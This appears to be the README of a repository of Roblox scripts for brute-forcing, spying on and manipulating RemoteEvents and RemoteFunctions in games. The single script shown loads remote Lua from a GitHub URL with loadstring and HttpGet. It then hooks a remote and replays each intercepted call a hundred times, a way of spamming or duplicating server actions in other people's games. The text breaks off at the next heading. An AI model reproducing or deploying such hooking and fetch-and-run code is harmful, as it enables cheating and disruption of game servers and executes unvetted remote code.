# Roblox Remote Vulnerability Testing Scripts

A collection of scripts for testing vulnerabilities in **RemoteEvents** and **RemoteFunctions** in Roblox games. These scripts assist in **brute-forcing remote calls**, **spying on RemoteFunctions**, and **manipulating remote arguments**.

## Scripts Overview

### 1️⃣ Remote Hooking  
Hooks into remote functions and executes custom logic on intercepted calls.  

<details>
  <summary>Click to expand</summary>

  ```lua
  local HS = loadstring(game:HttpGet('https://raw.githubusercontent.com/0zBug/HookingService/refs/heads/main/main.lua'))()
  local function HookFunction(originalFunction, remote, ...)
      local args = {...}
      print("arguments:", unpack(args))
      --
      for i = 1, 100 do
          originalFunction(remote, unpack(args))
      end
  
      return originalFunction(remote, unpack(args))
  end
  local remote = workspace
  HS:HookRemote(remote, HookFunction)
</details>

### 2️⃣ **RemoteFunction Spy**
